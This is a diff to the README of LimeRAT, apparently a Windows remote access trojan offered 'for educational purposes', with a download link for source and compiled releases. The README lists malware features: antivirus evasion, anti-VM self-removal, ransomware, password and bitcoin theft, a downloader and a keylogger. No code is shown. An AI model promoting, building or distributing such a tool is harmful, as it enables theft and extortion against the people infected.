@@ -1,13 +1,13 @@
 <img src="https://i.imgur.com/1DYYXt4.gif">
 
-# LimeRAT v0.1 [BETA]
+# LimeRAT v0.1.1 [BETA]
 	
 Simple yet powerful RAT which targeting Windows OS for educational purposes. This project is uncomplicated and easy to do or understand , targeting entry level developers, It should improve your knowledge and study for malware analysis and malware research.
 
  
 ## Main Features
 
-* .NET - Coded in Visual Basic .NET, Client required framework 2.0 dependency, And server is 4.0
+* .NET - Coded in Visual Basic .NET, Client required framework 2.0 or 4.0 dependency, And server is 4.0
  
 * Connection - Using pastebin.com as ip:port , Instead of noip.com DNS
 
@@ -17,11 +17,11 @@ Simple yet powerful RAT which targeting Windows OS for educational purposes. Thi
 
 * Bypass - Low AV detection and undetected startup
  
-* Lightweight - About 27 KB
+* Lightweight - Client size is 24 KB
 
 * Anti Virtual Machines - Uninstall itself if the machine is virtual to avoid scanning or analyzing
 
-* And more - Ransomware , passwords recovery , Remote desktop , Bitcoin grabber , Downloader , Keylogger
+* And more - ransomware , passwords recovery , remote desktop , bitcoin grabber , downloader , keylogger
  
 
 
@@ -48,6 +48,12 @@ To open project you need:
 2. Set Compiler to "Release" mode
 3. On Solution Explorer, Right click on "Solution LimeRAT Project" and press "Rebuild Solution"
 4. Everything will be under "\Project\_EXE\Release"
+
+
+## Download SRC and compiled version
+
+https://github.com/NYAN-x-CAT/Lime-RAT/releases
+
 
  ```
  This project was tested only on local lab. I do not know if it will work on external lab.
